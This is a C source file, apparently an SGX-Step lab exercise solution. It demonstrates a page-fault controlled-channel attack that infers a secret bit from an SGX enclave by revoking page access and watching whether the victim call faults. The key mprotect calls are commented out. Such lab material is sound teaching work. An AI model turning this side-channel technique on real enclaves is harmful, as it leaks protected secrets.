/* utility headers */
#include "cacheutils.h"
#include "libsgxstep/debug.h"
#include "libsgxstep/enclave.h"
#include "pf.h"
#include <sys/mman.h>

/* SGX untrusted runtime */
#include <sgx_urts.h>
// #include "Enclave/encl_u.h"
#include "encl_u.h"

void ocall_print_string(const char *str) { printf("%s", str); }

void ocall_print_int(const char *str, uint64_t i) {
  printf(str, i);
}

sgx_enclave_id_t create_enclave(char *so) {
  sgx_launch_token_t token = {0};
  int updated = 0;
  sgx_enclave_id_t eid = -1;

  info_event("Creating enclave...");
  SGX_ASSERT(sgx_create_enclave(so, /*debug=*/1, &token, &updated, &eid, NULL));

  return eid;
}

int fault_fired = 0;
void *a_pt = NULL;

void fault_handler(void *base_adrs) {
  /* =========================== START SOLUTION =========================== */
  /* 3. Restore access rights and continue enclave */
  if (a_pt) {
    info("Restoring access rights..");
    // ASSERT(!mprotect(a_pt, 4096, PROT_READ | PROT_WRITE));
  }
  /* =========================== END SOLUTION =========================== */

  fault_fired++;
}

int main(int argc, char **argv) {
  if (argc != 2) {
    info("Invalid arguments");
    exit(1);
  }
  sgx_enclave_id_t eid = create_enclave(argv[1]);
  set_debug_optin();
  int rv = 1, secret = 0;

  /* ---------------------------------------------------------------------- */
  info("registering fault handler..");
  register_fault_handler(fault_handler);
  info("registered fault handler..");

  SGX_ASSERT(ecall_get_a_adrs(eid, &a_pt));

  /* ---------------------------------------------------------------------- */
  info_event("inc_secret attack");

  /* =========================== START SOLUTION =========================== */
  /* 1. Revoke page access rights with mprotect system call */
  // ASSERT(!mprotect(a_pt, 4096, PROT_NONE));
  fault_fired = 0;

  /* 2. Execute victim */
  SGX_ASSERT(ecall_inc_secret(eid, /*secret=*/0));
  info("ecall_inc_secret(0) returned! SECRET=%d", fault_fired ? 1 : 0);

  // ASSERT(!mprotect(a_pt, 4096, PROT_NONE));
  fault_fired = 0;
  SGX_ASSERT(ecall_inc_secret(eid, /*secret=*/1));
  info("ecall_inc_secret(1) returned! SECRET=%d", fault_fired ? 1 : 0);
  /* =========================== END SOLUTION =========================== */

  /* ---------------------------------------------------------------------- */
  info_event("destroying SGX enclave");
  SGX_ASSERT(sgx_destroy_enclave(eid));

  info("all is well; exiting..");
  return 0;
}
